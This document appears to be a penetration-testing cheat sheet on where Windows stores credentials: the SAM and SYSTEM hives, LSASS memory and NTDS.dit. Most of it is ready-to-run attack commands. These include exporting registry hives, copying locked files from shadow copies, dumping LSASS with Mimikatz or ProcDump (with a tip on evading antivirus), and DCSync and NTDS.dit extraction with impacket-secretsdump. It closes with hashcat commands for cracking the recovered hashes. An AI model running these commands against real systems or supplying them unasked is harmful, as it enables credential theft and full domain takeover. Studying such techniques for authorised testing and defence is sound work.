# Windows Credential Storage

**Concept:** Windows stores credentials in three primary locations:
1. **SAM (Disk):** Local user hashes.
2. **LSA / LSASS (Memory):** Active session credentials (Cleartext/Kerberos).
3. **NTDS.dit (Domain Controller):** The database of all Active Directory users.
## 1. Local Storage (SAM & SYSTEM)
**Description:** The **Security Account Manager (SAM)** database stores local user passwords in NTLM format. It is encrypted using a key stored in the **SYSTEM** hive. **Location:** `C:\Windows\System32\config\SAM` & `SYSTEM` 
**Access:** Locked by the OS while running. You cannot just "copy" them.
### Extraction Method 1: Registry Save (Native)
**Context:** Use built-in Windows tools to export the hives, then download them to Kali to extract hashes offline.
```powershell
# 1. Export the hives
reg save HKLM\sam C:\Temp\sam.save
reg save HKLM\system C:\Temp\system.save
reg save HKLM\security C:\Temp\security.save

# 2. Exfiltrate files to Kali (SMB/HTTP)

# 3. Extract Hashes (Impacket on Kali)
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```
### Extraction Method 2: Volume Shadow Copies
**Context:** Copy the locked files from a shadow backup.
```powershell
# Create Shadow Copy
wmic shadowcopy call create Volume='C:\'

# Copy from Shadow Copy (Index usually starts at 1)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\sam.bak
```
## 2. Memory Storage (LSASS)
**Description:** The **Local Security Authority Subsystem Service (`lsass.exe`)** manages user logins. It holds:
- **Cleartext Passwords** (if WDigest is enabled). 
- **NTLM Hashes** (for SSO).
- **Kerberos Tickets** (TGT/TGS).
### Extraction Method 1: Mimikatz (The King)
**Risk:** High detection rate by AV/EDR.
```powershell
# Load Mimikatz
.\mimikatz.exe

# Elevate privileges
privilege::debug

# Dump Logon Passwords (Cleartext/Hashes)
sekurlsa::logonpasswords

# Dump LSA Secrets (Service accounts)
lsadump::lsa /patch
```
### Extraction Method 2: ProcDump (Stealthier)
**Context:** Use Microsoft's own tool (Sysinternals) to dump the process memory, then analyze it offline with Mimikatz. This often bypasses AV.
```powershell
# 1. Dump LSASS memory to a file
procdump.exe -ma lsass.exe lsass.dmp

# 2. Exfiltrate lsass.dmp to Kali

# 3. Analyze with Mimikatz (on Kali/Windows)
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
### Extraction Method 3: Task Manager (GUI)
1. Open Task Manager > Details. 
2. Right-click `lsass.exe`.
3. Select **"Create Dump File"**.
## 3. Domain Storage (NTDS.dit)
**Description:** The heart of Active Directory. Only exists on **Domain Controllers**. Contains every object in the domain (Users, Computers, Groups, Hashes). 
**Goal:** Extracting this equals "Game Over" for the domain.
### Extraction: DCSync (Network)
**Context:** If you are `Domain Admin` (or have Replication rights), you can ask the DC to replicate passwords to you without logging in.
```powershell
# Using Impacket (Kali)
impacket-secretsdump -just-dc-ntlm <DOMAIN>/<USER>:<PASS>@<DC_IP>
```
### Extraction: VSS (Local on DC)
**Context:** If you have RDP/Shell access to the DC.
```powershell
# 1. Create Shadow Copy
vssadmin create shadow /for=C:

# 2. Copy NTDS.dit and SYSTEM hive
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
reg save HKLM\SYSTEM C:\Temp\system.save

# 3. Extract offline (Kali)
impacket-secretsdump -ntds ntds.dit -system system.save LOCAL
```
## 4. Hash Formats & Cracking
**Crucial Distinction:** Windows uses two main hash types. Confusing them leads to failed cracking attempts.

| **Name**         | **Source**              | **Format Example**                | **Action**                 |
| ---------------- | ----------------------- | --------------------------------- | -------------------------- |
| *NTLM (v1/v2)* | SAM, NTDS, LSASS        | `8846F7EAEE8FB...` (32 chars hex) | **Pass-The-Hash** or Crack |
| *Net-NTLMv2*   | SMB Capture (Responder) | `admin::DOMAIN:11223344...`       | **Relay** or Crack         |
### Cracking with Hashcat
**Hashcat Modes:**
- **1000:** NTLM (The static hash from SAM/NTDS).
- **5600:** NetNTLMv2 (Captured from the network via Responder).
- **3000:** LM (Legacy, rarely seen now).
```shell
# Cracking NTLM (SAM Dump) - FAST
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt

# Cracking NetNTLMv2 (Responder Capture) - SLOWER
hashcat -m 5600 -a 0 responder_capture.txt rockyou.txt
```